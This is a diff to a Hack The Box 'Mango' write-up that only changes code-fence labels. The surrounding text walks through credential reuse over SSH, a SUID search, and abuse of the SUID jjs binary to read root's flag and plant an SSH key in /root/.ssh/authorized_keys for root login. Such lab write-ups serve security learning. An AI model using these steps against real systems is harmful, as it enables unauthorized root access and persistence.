@@ -144,7 +144,7 @@ lets try to ssh with the credentials found
 i was not able to ssh as admin but mango credentials worked  
 but there was not user.txt in /home/mango  
 so i tried 'su admin' with admin's password found above and it worked  
-```
+```console
 root@kali:~/Desktop/HTB# ssh mango@10.10.10.162                                                                                                                                                               [4/4]
 mango@10.10.10.162's password:                                                                                                                                                                                     
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)                                                                                                                                                 
@@ -211,7 +211,7 @@ now lets try to get root shell
 i went through the files in /var/www/staging but there was nothing particularly interesting  
 so i searched for SUID binaries using find and found jjs which has a gtfobins page  
 https://gtfobins.github.io/gtfobins/jjs/
-```
+```console
 admin@mango:/home/admin$ find / -perm -4000 2>/dev/null                                                                                                                                                            
 /bin/fusermount                                                                                                                                                                                                    
 /bin/mount                                                                                                                                                                                                         
@@ -287,7 +287,7 @@ looking through the gtfobins page for jjs i figured we can directly read /root/r
 
 ![](images/gtfoFileRead.png)
 
-```
+```console
 admin@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ jjs
 Warning: The jjs tool is planned to be removed from a future JDK release
 jjs> var BufferedReader = Java.type("java.io.BufferedReader");
@@ -300,7 +300,7 @@ jjs>
 
 later i found out that there is an easier way than given on gtfobins page  
 if we run jjs with "-scripting" tag then we can directly run bash commands  
-```
+```console
 admin@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ jjs -scripting
 Warning: The jjs tool is planned to be removed from a future JDK release
 jjs> $EXEC("cat /root/root.txt");
@@ -313,7 +313,7 @@ we know we can write files as root so we can add our ssh keys and then ssh as ro
 for writing in a file we can either use commands given on gtfobins or directly use bash commands  
 
 first create RSA keys using ssh-keygen  
-```
+```console
 root@kali:~/Desktop/HTB/activeMachines/Linux/Mango# ssh-keygen                                                                                                                                                     
 Generating public/private rsa key pair.                                                                                                                                                                            
 Enter file in which to save the key (/root/.ssh/id_rsa): ./sshRootKeys/id_rsa                                                                                                                                      
@@ -338,7 +338,7 @@ The key's randomart image is:
 ```
 
 now write the public key (id_rsa.pub) in /root/.ssh/authorized_keys using jjs  
-```
+```console
 admin@mango:/usr/lib/jvm/java-11-openjdk-amd64/bin$ jjs -scripting
 Warning: The jjs tool is planned to be removed from a future JDK release
 jjs> $EXEC("echo 'ssh-rsa AAAAB3NzaC1yc2......EAAAADAQABx0= root@kali' > /root/.ssh/authorized_keys");
@@ -346,7 +346,7 @@ jjs>
 ```
 
 now we can ssh as root using the id_rsa key we generated using ssh-keygen  
-```
+```console
 root@kali:~/Desktop/HTB/activeMachines/Linux/Mango# ssh -i sshRootKeys/id_rsa root@10.10.10.162
 Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
 
